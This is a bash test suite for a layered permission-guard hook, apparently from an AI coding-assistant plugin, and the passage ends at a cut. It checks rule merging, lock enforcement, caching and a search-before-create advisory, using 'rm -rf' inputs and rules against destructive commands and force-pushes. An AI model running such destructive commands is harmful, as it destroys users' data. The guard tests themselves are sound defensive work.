#!/bin/bash
# pins: SB_RULES_LAYERS — the layering feature's own kill switch; the whole point of this file
# pins: SB_SEARCH_FIRST — pg_search's kill switch, exercised directly
# pins: SB_REPO_KEY_COMMON_DIR — sb_repo_key's kill switch, exercised directly
# pins: SB_RESOURCE_SCOPE — off, so the resource-scope guard never asks first and masks the
#   rules-layer verdict being asserted (same idiom test-persona-tool-guard.sh already uses)
# pins: SB_PROTOCOL_GUARD — set =off is asserted as a no-op guard elsewhere; not toggled here,
#   listed because protocol-guard.sh is driven directly
#
# Slice 3 (docs/plans/2026-09-24-repo-brain.md) — layered plugin/user/repo rules, the learning
# loop closing per repo, search-before-create, and one brain per git-worktree family.
set -u
ROOT="$(cd "$(dirname "$0")"/.. && pwd)"
GUARD="$ROOT/scripts/persona-tool-guard.sh"
PGUARD="$ROOT/scripts/protocol-guard.sh"
MERGESIG="$ROOT/scripts/merge-persona-signals.sh"

fail_n=0
fail() { echo "FAIL: $1"; fail_n=$((fail_n + 1)); }
pass() { echo "PASS: $1"; }

TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT

# A PATH-shim jq that counts every invocation (real work still happens via $REAL_JQ) — used to
# prove "zero jq spawns from sb_rules_effective on an unchanged, cache-warm second call".
SHIMDIR="$TMP/shim"; mkdir -p "$SHIMDIR"
REAL_JQ=$(command -v jq)
cat > "$SHIMDIR/jq" <<SHIM
#!/bin/bash
echo 1 >> "\$JQ_COUNT_FILE"
exec "$REAL_JQ" "\$@"
SHIM
chmod +x "$SHIMDIR/jq"
jq_count() { # <count-file> <cmd...>  -> prints the spawn count for that one invocation
  local cf="$1"; shift
  : > "$cf"
  JQ_COUNT_FILE="$cf" PATH="$SHIMDIR:$PATH" "$@" >/dev/null 2>&1
  wc -l < "$cf" | tr -d ' '
}

# --------------------------------------------------------------------------
# 1. Layering: P (real defaults) + U (loosen-attempt + a repo-only rule) + R
#    (deny override + disable-attempt on a locked default).
# --------------------------------------------------------------------------
B1="$TMP/b1"; mkdir -p "$B1/projects/demo" "$B1/.injected"
printf 'demo' > "$B1/.injected/s1.slug"
cat > "$B1/persona-rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"warn-rm-rf","action":"warn"},{"name":"repo-only","tool":"Bash","match_command":"make deploy","action":"warn","reason":"u"}]}
EOF
cat > "$B1/projects/demo/rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"repo-only","action":"deny","reason":"r"},{"name":"warn-force-push-main","enabled":false}]}
EOF
run1() { printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"%s"}}' "$B1" "$1" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B1" bash "$GUARD"; }

out=$(run1 "make deploy")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "layering: make deploy should deny (repo-only overrides U's warn) — got: $out"
out=$(run1 "rm -rf /tmp/x")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "layering: rm -rf should ask (warn-rm-rf stays locked at ask) — got: $out"

EFF1="$B1/projects/demo/.rules-effective.json"
[ -s "$EFF1" ] || fail "layering: no .rules-effective.json cache was written"
jq -e '.violations|length == 2' "$EFF1" >/dev/null \
  || fail "layering: expected exactly 2 violations, got: $(jq -c '.violations' "$EFF1" 2>/dev/null)"
jq -e '.rules[]|select(.name=="warn-force-push-main")|.name=="warn-force-push-main"' "$EFF1" >/dev/null \
  || fail "layering: warn-force-push-main (locked) should still be present (disable rejected)"
[ "$(grep -c '"rule":"rules-lock-violation"' "$B1/audit-log.jsonl" 2>/dev/null)" = "2" ] \
  || fail "layering: expected 2 rules-lock-violation flag rows in audit-log"
grep -q 'gate=rules-effective.*violations=2' "$B1/audit-log.jsonl" \
  || fail "layering: expected one gate=rules-effective row with violations=2"
pass "layering: P+U+R merge, lock enforcement, violations logged, correct verdicts"

# --------------------------------------------------------------------------
# 2. Repo lock ignored: R cannot set lock, even on a brand-new rule name.
# --------------------------------------------------------------------------
B2="$TMP/b2"; mkdir -p "$B2/projects/demo" "$B2/.injected"
printf 'demo' > "$B2/.injected/s1.slug"
cat > "$B2/persona-rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"x","enabled":false}]}
EOF
cat > "$B2/projects/demo/rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"x","tool":"Bash","match_command":"foo","action":"warn","lock":true}]}
EOF
run1_b2() { printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"echo hi"}}' "$B2" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B2" bash "$GUARD" >/dev/null 2>&1; }
run1_b2   # trigger a rebuild/read so the cache exists
EFF2="$B2/projects/demo/.rules-effective.json"
jq -e '(.rules|map(select(.name=="x"))|length) == 0' "$EFF2" >/dev/null \
  || fail "repo lock ignored: effective set should have no rule 'x' (repo cannot set lock)"
grep -q '"rule":"rules-lock-violation".*"reason":"repo attempted lock"' "$B2/audit-log.jsonl" \
  || fail "repo lock ignored: expected a 'repo attempted lock' violation row"
pass "repo lock ignored: a repo-authored lock:true is stripped and logged, not honoured"

# --------------------------------------------------------------------------
# 3. Cache: a cold rebuild spawns exactly 1 jq from sb_rules_effective, a warm
#    call spawns exactly 0 — ABSOLUTE counts (review fix: comparing two
#    same-state warm calls to each other is a tautology that can't fail even
#    if sb_rules_effective rebuilt every single time); touching R rebuilds
#    even within the SAME second (equal mtime must count as stale — no sleep).
# --------------------------------------------------------------------------
B3="$TMP/b3"; mkdir -p "$B3/projects/demo" "$B3/.injected"
printf 'demo' > "$B3/.injected/s1.slug"
cat > "$B3/projects/demo/rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"repo-only3","tool":"Bash","match_command":"make deploy","action":"warn","reason":"r1"}]}
EOF
payload3() { printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"make deploy"}}' "$B3"; }

# Baseline: sourcing lib.sh alone spawns its own jq (kb-schema.sh, unrelated to rules layering)
# — the delta against THIS baseline is what isolates sb_rules_effective's own spawn count,
# rather than pinning a magic total that would break the moment some unrelated top-of-file
# jq call is added or removed.
n_base=$(jq_count "$TMP/jcbase" bash -c "source '$ROOT/scripts/lib.sh'")
n_cold=$(jq_count "$TMP/jc0" bash -c "source '$ROOT/scripts/lib.sh'; BRAIN_DIR='$B3' sb_rules_effective demo")
[ "$n_cold" -gt "$n_base" ] || fail "cache: a cold rebuild should spawn at least one jq beyond baseline sourcing (base=$n_base, cold=$n_cold)"
# The zero-spawn assertion below must not depend on sub-second `-nt` precision (bash 3.2's
# whole-second mtime floor makes a same-second cache write indistinguishable from "not
# newer" either way) — pin R's mtime to a fixed past instant so the warm call's staleness
# check is unambiguous regardless of how fast the cold rebuild above just ran.
touch -t 202001010000 "$B3/projects/demo/rules.json"
n_warm=$(jq_count "$TMP/jc1" bash -c "source '$ROOT/scripts/lib.sh'; BRAIN_DIR='$B3' sb_rules_effective demo")
[ "$n_warm" = "$n_base" ] || fail "cache: a warm call should spawn ZERO jq beyond baseline sourcing (base=$n_base, warm=$n_warm) — sb_rules_effective is re-spawning on a fresh cache"
pass "cache: a cold rebuild spawns jq, a warm call spawns exactly zero beyond baseline sourcing (absolute counts, not a same-state comparison)"

cat > "$B3/projects/demo/rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"repo-only3","tool":"Bash","match_command":"make deploy","action":"deny","reason":"r2"}]}
EOF
out=$(payload3 | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B3" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "cache: touching R (even within the same second — no sleep) should rebuild and the new verdict should apply — got: $out"
pass "cache: touching R triggers a rebuild even within the same second, and the new verdict is honoured"

# --------------------------------------------------------------------------
# 3b. Cache staleness: a DELETED layer, or a different CLAUDE_PLUGIN_ROOT,
#     must also force a rebuild — neither is visible to an mtime `-nt` check
#     against layers that exist NOW.
# --------------------------------------------------------------------------
B3b="$TMP/b3b"; mkdir -p "$B3b/projects/demo" "$B3b/.injected"
printf 'demo' > "$B3b/.injected/s1.slug"
cat > "$B3b/projects/demo/rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"deploy-deny","tool":"Bash","match_command":"make deploy","action":"deny","reason":"r"}]}
EOF
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"make deploy"}}' "$B3b" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B3b" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "cache staleness (deleted layer): make deploy should deny before the repo layer is removed — got: $out"
rm -f "$B3b/projects/demo/rules.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"make deploy"}}' "$B3b" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B3b" bash "$GUARD")
[ -z "$out" ] || fail "cache staleness (deleted layer): after removing the repo layer, make deploy should no longer deny — got: $out"
jq -e '(.layers | index("repo")) == null' "$B3b/projects/demo/.rules-effective.json" >/dev/null \
  || fail "cache staleness (deleted layer): the rebuilt cache should no longer list 'repo' among .layers"
pass "cache staleness: removing a layer forces a rebuild (the mtime check alone can't see a deletion)"

B3c="$TMP/b3c"; mkdir -p "$B3c/.injected"
printf 'demo' > "$B3c/.injected/s1.slug"
PROOT_A="$TMP/proot-a/scripts"; mkdir -p "$PROOT_A"
cp "$ROOT/scripts/persona-rules.default.json" "$PROOT_A/persona-rules.default.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"rm -rf /tmp/x"}}' "$B3c" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B3c" CLAUDE_PLUGIN_ROOT="$TMP/proot-a" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "cache staleness (plugin root change): rm -rf under proot-a should ask via the shipped default — got: $out"
PROOT_B="$TMP/proot-b/scripts"; mkdir -p "$PROOT_B"
jq '.rules |= map(if .name=="warn-rm-rf" then .action="deny" else . end)' "$ROOT/scripts/persona-rules.default.json" \
  > "$PROOT_B/persona-rules.default.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"rm -rf /tmp/x"}}' "$B3c" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B3c" CLAUDE_PLUGIN_ROOT="$TMP/proot-b" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "cache staleness (plugin root change): switching CLAUDE_PLUGIN_ROOT to a different P should rebuild and honour its deny — got: $out"
pass "cache staleness: switching CLAUDE_PLUGIN_ROOT forces a rebuild (a stale cache from a different P is never reused)"

# --------------------------------------------------------------------------
# 4. Broken repo layer: invalid JSON in R never denies — P+U keep working.
#    No usable layer at all -> the existing D154 fail-safe deny.
# --------------------------------------------------------------------------
B4="$TMP/b4"; mkdir -p "$B4/projects/demo" "$B4/.injected"
printf 'demo' > "$B4/.injected/s1.slug"
printf '{not json' > "$B4/projects/demo/rules.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"rm -rf /tmp/x"}}' "$B4" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B4" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "broken repo layer: verdict should still be ask via P (got: $out)"
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision != "deny"' >/dev/null \
  || fail "broken repo layer: a broken layer must never deny"
grep -q 'rules-layer repo unreadable' "$B4/error-log.jsonl" 2>/dev/null \
  || fail "broken repo layer: expected an error-log line naming the repo layer unreadable"
pass "broken repo layer: invalid R is skipped+logged, guard still works from P+U, never denies"

B4b="$TMP/b4b"; mkdir -p "$B4b/.injected"
printf 'nolayers' > "$B4b/.injected/s1.slug"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"rm -rf /tmp/x"}}' "$B4b" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B4b" CLAUDE_PLUGIN_ROOT="$TMP/no-such-plugin-root" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "no usable layer: should hit the D154 fail-safe deny (got: $out)"
pass "no usable layer at all: falls through to the existing D154 fail-safe deny"

# --------------------------------------------------------------------------
# 5. Kill switch: SB_RULES_LAYERS=off restores today's U/P precedence exactly —
#    R's deny is never consulted, and no cache file is written.
# --------------------------------------------------------------------------
B5="$TMP/b5"; mkdir -p "$B5/projects/demo" "$B5/.injected"
printf 'demo' > "$B5/.injected/s1.slug"
cat > "$B5/projects/demo/rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"kswitch","tool":"Bash","match_command":"make deploy","action":"deny","reason":"should never apply"}]}
EOF
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"make deploy"}}' "$B5" \
  | SB_RESOURCE_SCOPE=off SB_RULES_LAYERS=off BRAIN_DIR="$B5" bash "$GUARD")
# No U file exists in this fixture and R's "kswitch" rule is repo-only, so with layering off
# (today's U-then-P precedence, R never consulted) the correct result is SILENCE — a real
# "deny leaked through" bug would show up as a non-empty deny payload, not empty output.
[ -z "$out" ] || { [ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision != "deny"' >/dev/null \
  || fail "kill switch: SB_RULES_LAYERS=off must not apply R's deny (got: $out)"; }
[ ! -e "$B5/projects/demo/.rules-effective.json" ] \
  || fail "kill switch: SB_RULES_LAYERS=off must never write a .rules-effective.json cache"
pass "kill switch: SB_RULES_LAYERS=off restores today's U/P precedence, no cache, repo ignored"

# --------------------------------------------------------------------------
# 6. Candidates per repo: merge-persona-signals.sh --slug arms into the REPO
#    layer, never the user file; without --slug the user file still receives it.
# --------------------------------------------------------------------------
B6="$TMP/b6"; mkdir -p "$B6"
PAYLOAD6='{"persona_signals":[],"rule_candidates":[{"event":"bash","pattern":"npm run migrate","message":"always confirm before migrating"}]}'
for i in 1 2 3; do printf '%s' "$PAYLOAD6" | BRAIN_DIR="$B6" bash "$MERGESIG" --slug demo >/dev/null 2>&1; done
[ "$(jq -r '.learned[0].pattern' "$B6/projects/demo/rules.json" 2>/dev/null)" = "npm run migrate" ] \
  || fail "candidates per repo: repo rules.json .learned[0].pattern should be the armed candidate"
[ "$(jq -r '.learned[0].action' "$B6/projects/demo/rules.json" 2>/dev/null)" = "warn" ] \
  || fail "candidates per repo: armed candidate action should be warn"
[ ! -e "$B6/persona-rules.json" ] \
  || fail "candidates per repo: --slug must NOT arm into the user persona-rules.json"

mkdir -p "$B6/.injected"; printf 'demo' > "$B6/.injected/s1.slug"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"npm run migrate"}}' "$B6" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B6" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.additionalContext | test("confirm before migrating")' >/dev/null \
  || fail "candidates per repo: a session pinned to demo should warn on the armed learned pattern (got: $out)"

printf 'other' > "$B6/.injected/s2.slug"
out2=$(printf '{"tool_name":"Bash","session_id":"s2","cwd":"%s","tool_input":{"command":"npm run migrate"}}' "$B6" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B6" bash "$GUARD")
[ -z "$out2" ] \
  || fail "candidates per repo: a session pinned to a DIFFERENT repo must not see demo's learned rule (got: $out2)"

B6u="$TMP/b6u"; mkdir -p "$B6u"
for i in 1 2 3; do printf '%s' "$PAYLOAD6" | BRAIN_DIR="$B6u" bash "$MERGESIG" >/dev/null 2>&1; done
[ "$(jq -r '.learned[0].pattern' "$B6u/persona-rules.json" 2>/dev/null)" = "npm run migrate" ] \
  || fail "candidates per repo: WITHOUT --slug, the user file should still receive the armed candidate"
pass "candidates per repo: --slug arms the repo layer only, is session-scoped, and the no-slug path is unchanged"

# --------------------------------------------------------------------------
# 7. Self-edit ask for the repo rules layer (Write + Edit) — regression-locked
#    in more depth in test-persona-tool-guard.sh; one direct check here too.
# --------------------------------------------------------------------------
B7="$TMP/b7"; mkdir -p "$B7"
out=$(printf '{"tool_name":"Write","session_id":"s1","tool_input":{"file_path":"%s/projects/demo/rules.json","content":"{}"}}' "$B7" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B7" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "self-edit ask: Write to repo rules.json should ask (got: $out)"
grep -q '"rule":"warn-self-edit-repo-rules"' "$B7/audit-log.jsonl" \
  || fail "self-edit ask: expected rule warn-self-edit-repo-rules in the audit row"
pass "self-edit ask: Write to a repo rules.json asks via warn-self-edit-repo-rules"

# --------------------------------------------------------------------------
# 8. Search-first: a Write of a path whose basename already exists elsewhere
#    in the repo warns once; an existing path and a no-namesake path stay silent.
# --------------------------------------------------------------------------
B8="$TMP/b8"; mkdir -p "$B8/.injected"
R8="$TMP/repo8"; mkdir -p "$R8/lib"
( cd "$R8" && git init -q && git config user.email a@b.c && git config user.name a
  printf 'export {}' > lib/util.ts && git add -A && git commit -q -m init )
printf 'demo8' > "$B8/.injected/s1.slug"
pgpre() { printf '{"hook_event_name":"PreToolUse","tool_name":"Write","session_id":"s1","cwd":"%s","tool_input":{"file_path":"%s"}}' "$R8" "$1" \
  | BRAIN_DIR="$B8" bash "$PGUARD" pre; }

out=$(pgpre "$R8/src/new/util.ts")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.additionalContext | (test("lib/util.ts") and test("Search before creating"))' >/dev/null \
  || fail "search-first: a namesake write should warn with the existing path named (got: $out)"
grep -q 'gate=search-first tool=Write path=src/new/util.ts matches=1 hits=lib/util.ts verdict=warn' "$B8/audit-log.jsonl" \
  || fail "search-first: expected the exact gate=search-first warn row"

out=$(pgpre "$R8/lib/util.ts")
[ -z "$out" ] || fail "search-first: a Write to an EXISTING path must produce no output (got: $out)"

out=$(pgpre "$R8/src/brand-new.ts")
[ -z "$out" ] || fail "search-first: a namesake-free new path must produce no output (got: $out)"
grep -q 'gate=search-first tool=Write path=src/brand-new.ts matches=0 hits=none verdict=ok' "$B8/audit-log.jsonl" \
  || fail "search-first: expected a verdict=ok row for the no-namesake path"

out=$(printf '{"hook_event_name":"PreToolUse","tool_name":"Write","session_id":"s1","cwd":"%s","tool_input":{"file_path":"%s"}}' "$R8" "$R8/src/another/util.ts" \
  | SB_SEARCH_FIRST=off BRAIN_DIR="$B8" bash "$PGUARD" pre)
[ -z "$out" ] || fail "search-first: SB_SEARCH_FIRST=off must suppress everything (got: $out)"

GITSHIMDIR="$TMP/gitshim"; mkdir -p "$GITSHIMDIR"
REAL_GIT=$(command -v git)
cat > "$GITSHIMDIR/git" <<SHIM
#!/bin/bash
echo 1 >> "\$GIT_COUNT_FILE"
exec "$REAL_GIT" "\$@"
SHIM
chmod +x "$GITSHIMDIR/git"
: > "$TMP/gitcount"
GIT_COUNT_FILE="$TMP/gitcount" PATH="$GITSHIMDIR:$PATH" bash -c \
  "printf '{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Write\",\"session_id\":\"s1\",\"cwd\":\"$R8\",\"tool_input\":{\"file_path\":\"$R8/src/yet-another.ts\"}}' | BRAIN_DIR='$B8' bash '$PGUARD' pre" >/dev/null 2>&1
[ "$(wc -l < "$TMP/gitcount" | tr -d ' ')" = "0" ] \
  || fail "search-first: the per-session lsfiles cache should already be warm — expected zero git spawns on a later call"
pass "search-first: warns on a namesake, silent on existing/no-namesake paths, kill switch honoured, ls-files cached once"

# --------------------------------------------------------------------------
# 8b. Search-first: a Write OUTSIDE the repo root must never be checked (no
#     default branch previously left `rel` as the full absolute path, so its
#     basename still got matched against the session repo's ls-files).
# --------------------------------------------------------------------------
B8b="$TMP/b8b"; mkdir -p "$B8b/.injected"
printf 'demo8' > "$B8b/.injected/s1.slug"
OUTSIDE_DIR="$TMP/elsewhere8b"; mkdir -p "$OUTSIDE_DIR"
out=$(printf '{"hook_event_name":"PreToolUse","tool_name":"Write","session_id":"s1","cwd":"%s","tool_input":{"file_path":"%s"}}' "$R8" "$OUTSIDE_DIR/util.ts" \
  | BRAIN_DIR="$B8b" bash "$PGUARD" pre)
[ -z "$out" ] || fail "search-first: a Write outside the repo root must produce no output (got: $out)"
grep -q 'gate=search-first' "$B8b/audit-log.jsonl" 2>/dev/null \
  && fail "search-first: a Write outside the repo root must never log a gate=search-first row"
pass "search-first: a Write outside the repo root is never checked"

# --------------------------------------------------------------------------
# 8c. Search-first: a non-git cwd must skip loudly (verdict=skip reason=nogit,
#     an error-log line), never silently cache an empty ls-files as "no
#     matches, verdict=ok" for every future Write in that session.
# --------------------------------------------------------------------------
B8c="$TMP/b8c"; mkdir -p "$B8c/.injected"
NOGIT_DIR="$TMP/nogit8c"; mkdir -p "$NOGIT_DIR"
printf 'demo8c' > "$B8c/.injected/s1.slug"
out=$(printf '{"hook_event_name":"PreToolUse","tool_name":"Write","session_id":"s1","cwd":"%s","tool_input":{"file_path":"%s"}}' "$NOGIT_DIR" "$NOGIT_DIR/new.ts" \
  | BRAIN_DIR="$B8c" bash "$PGUARD" pre)
[ -z "$out" ] || fail "search-first: a non-git cwd must produce no output (got: $out)"
grep -q 'gate=search-first.*verdict=skip reason=nogit' "$B8c/audit-log.jsonl" 2>/dev/null \
  || fail "search-first: expected a verdict=skip reason=nogit audit row for a non-git cwd"
grep -q 'search-first: git ls-files failed' "$B8c/error-log.jsonl" 2>/dev/null \
  || fail "search-first: expected an error-log line naming the git ls-files failure"
pass "search-first: a non-git cwd logs verdict=skip reason=nogit loudly, never a silent verdict=ok"

# --------------------------------------------------------------------------
# 9. Repo key (bash): a linked worktree shares its main repo's slug; a plain
#    repo is unchanged; the kill switch restores the worktree's own basename.
# --------------------------------------------------------------------------
source "$ROOT/scripts/lib.sh"
WK="$TMP/wk"; mkdir -p "$WK/main-repo"
( cd "$WK/main-repo" && git init -q && git config user.email a@b.c && git config user.name a \
  && git commit -q --allow-empty -m init && git worktree add -q "$WK/wt" -b wtb ) 2>/dev/null
out=$(cd "$WK/wt" && sb_detect_project "$PWD" | cut -f1)
[ "$out" = "main-repo" ] || fail "repo key (bash): sb_detect_project on a linked worktree should print main-repo's slug (got: $out)"
out=$(CLAUDE_PROJECT_DIR="$WK/wt" bash -c "source '$ROOT/scripts/lib.sh'; sb_resolve_slug")
[ "$out" = "main-repo" ] || fail "repo key (bash): sb_resolve_slug(CLAUDE_PROJECT_DIR=<worktree>) should print main-repo (got: $out)"

mkdir -p "$WK/solo"; ( cd "$WK/solo" && git init -q )
out=$(cd "$WK/solo" && sb_detect_project "$PWD" | cut -f1)
[ "$out" = "solo" ] || fail "repo key (bash): a plain non-worktree repo should still print its own basename (got: $out)"

out=$(cd "$WK/wt" && SB_REPO_KEY_COMMON_DIR=off sb_detect_project "$PWD" | cut -f1)
[ "$out" = "wt" ] || fail "repo key (bash): SB_REPO_KEY_COMMON_DIR=off should restore the worktree's own basename (got: $out)"
pass "repo key (bash): worktree shares the main repo's slug; plain repos and the kill switch are unaffected"

# --------------------------------------------------------------------------
# 10. Skill rename: skills/rules exists with the right shape, skills/audit gone.
# --------------------------------------------------------------------------
[ -f "$ROOT/skills/rules/SKILL.md" ] || fail "skill rename: skills/rules/SKILL.md is missing"
[ ! -d "$ROOT/skills/audit" ] || fail "skill rename: skills/audit/ should no longer exist"
grep -q '^name: rules$' "$ROOT/skills/rules/SKILL.md" 2>/dev/null || fail "skill rename: SKILL.md frontmatter name: is not 'rules'"
for heading in show audit distill promote demote; do
  grep -qi "^## \`\?$heading" "$ROOT/skills/rules/SKILL.md" 2>/dev/null \
    || fail "skill rename: missing the '$heading' subcommand heading"
done
grep -qi 'lock' "$ROOT/skills/rules/SKILL.md" || fail "skill rename: SKILL.md never mentions 'lock'"
grep -qi 'layer' "$ROOT/skills/rules/SKILL.md" || fail "skill rename: SKILL.md never mentions 'layer'"
pass "skill rename: skills/rules/SKILL.md has the right shape, skills/audit is gone"

# --------------------------------------------------------------------------
# 11. Protocol lock holds: pg_search never writes to .claude/rules, CLAUDE.md or
#     MEMORY.md, and its output only ever carries additionalContext (warn), never
#     a permissionDecision — mirrors what tests/test-protocol-guard.sh's source
#     scan (Slice 1) checks; that file does not exist yet in this worktree
#     (Slice 1 has not landed here), so this is a direct behavioral proof of the
#     same invariant limited to Slice 3's own pg_search body.
# --------------------------------------------------------------------------
PG_BODY=$(awk '/^pg_search\(\) \{/,/^# --- end pg_search ---/' "$PGUARD")
echo "$PG_BODY" | grep -qE '\.claude/rules|CLAUDE\.md|MEMORY\.md' \
  && fail "protocol lock: pg_search body references a forbidden write target" \
  || pass "protocol lock: pg_search never references .claude/rules, CLAUDE.md or MEMORY.md"
echo "$PG_BODY" | grep -q 'permissionDecision' \
  && fail "protocol lock: pg_search body must never construct a permissionDecision" \
  || pass "protocol lock: pg_search never emits a permissionDecision (warn-only, via pg_ctx_add)"

# --------------------------------------------------------------------------
# 12. Search-first codemap: the slug memo is written WITHOUT a trailing newline
#     (printf '%s', as session-load.sh actually writes it) — `read` on a no-newline
#     EOF file returns nonzero even though it DID populate the variable, and the
#     old `|| slug=""` clobbered it, so the codemap cache was always built empty.
# --------------------------------------------------------------------------
B12="$TMP/b12"; mkdir -p "$B12/.injected" "$B12/projects/demo12/codemap"
R12="$TMP/repo12"; mkdir -p "$R12/src"
( cd "$R12" && git init -q && git config user.email a@b.c && git config user.name a \
  && printf 'export {}' > src/placeholder.ts && git add -A && git commit -q -m init )
printf '%s' 'demo12' > "$B12/.injected/s1.slug"   # NO trailing newline — the exact repro shape
cat > "$B12/projects/demo12/codemap/graph.json" <<'EOF'
{"files":[{"id":"pkg/core/widget.ts"}]}
EOF
out=$(printf '{"hook_event_name":"PreToolUse","tool_name":"Write","session_id":"s1","cwd":"%s","tool_input":{"file_path":"%s"}}' "$R12" "$R12/src/widget.ts" \
  | BRAIN_DIR="$B12" bash "$PGUARD" pre)
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.additionalContext | test("pkg/core/widget.ts")' >/dev/null \
  || fail "codemap slug clobber: Write of widget.ts should warn citing pkg/core/widget.ts from the codemap (got: $out)"
[ -s "$B12/.injected/s1.codemap.tsv" ] \
  || fail "codemap slug clobber: .injected/s1.codemap.tsv should be non-empty"
grep -q 'gate=search-first tool=Write path=src/widget.ts matches=1 hits=pkg/core/widget.ts verdict=warn' "$B12/audit-log.jsonl" \
  || fail "codemap slug clobber: expected the exact gate=search-first warn row citing the codemap hit"
pass "codemap slug clobber: a no-trailing-newline slug memo is read correctly, codemap cache populates"

# --------------------------------------------------------------------------
# 13. Search-first PG_CWD normalization: a Windows-form (backslash) cwd/path must
#     still resolve to a repo-relative path= in telemetry and still find a namesake.
# --------------------------------------------------------------------------
CWD_BS="${R8//\//\\}"
FP_BS="${CWD_BS}\\src\\util.ts"
payload13=$(jq -nc --arg cwd "$CWD_BS" --arg fp "$FP_BS" \
  '{hook_event_name:"PreToolUse",tool_name:"Write",session_id:"s1",cwd:$cwd,tool_input:{file_path:$fp}}')
out=$(printf '%s' "$payload13" | BRAIN_DIR="$B8" bash "$PGUARD" pre)
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.additionalContext | test("lib/util.ts")' >/dev/null \
  || fail "PG_CWD normalization: a backslash-form cwd/path should still find the lib/util.ts namesake (got: $out)"
grep -q 'gate=search-first tool=Write path=src/util.ts matches=1 hits=lib/util.ts verdict=warn' "$B8/audit-log.jsonl" \
  || fail "PG_CWD normalization: expected a repo-relative path=src/util.ts in the audit row (raw absolute path means PG_CWD was never normalized)"
pass "PG_CWD normalization: a Windows-form cwd/path still yields a repo-relative telemetry path and finds the namesake"

# --------------------------------------------------------------------------
# 14. Search-first context cap (<=300 B) and sessionless calls never touch a
#     shared cache.
# --------------------------------------------------------------------------
B14="$TMP/b14"; mkdir -p "$B14/.injected"
R14="$TMP/repo14"; mkdir -p "$R14"
( cd "$R14" && git init -q && git config user.email a@b.c && git config user.name a
  for i in 1 2 3 4 5; do
    d="packages/very-long-package-name-number-$i/src/components/deeply/nested/folder/structure"
    mkdir -p "$d"; printf 'export {}' > "$d/util.ts"
  done
  git add -A && git commit -q -m init )
printf 'demo14' > "$B14/.injected/s1.slug"
out=$(printf '{"hook_event_name":"PreToolUse","tool_name":"Write","session_id":"s1","cwd":"%s","tool_input":{"file_path":"%s"}}' "$R14" "$R14/src/newmodule/util.ts" \
  | BRAIN_DIR="$B14" bash "$PGUARD" pre)
ctx=$(printf '%s' "$out" | jq -r '.hookSpecificOutput.additionalContext // empty' 2>/dev/null)
ctxlen=$(printf '%s' "$ctx" | wc -c | tr -d ' ')
[ -n "$ctx" ] && [ "$ctxlen" -le 300 ] && printf '%s' "$ctx" | grep -q "Search before creating" \
  || fail "search-first cap: additionalContext should be non-empty, <=300 bytes and mention the advisory (got $ctxlen bytes: $ctx)"
pass "search-first cap: additionalContext stays <=300 bytes even with many long namesake hits"

out2=$(printf '{"hook_event_name":"PreToolUse","tool_name":"Write","cwd":"%s","tool_input":{"file_path":"%s"}}' "$R14" "$R14/src/another-new/util.ts" \
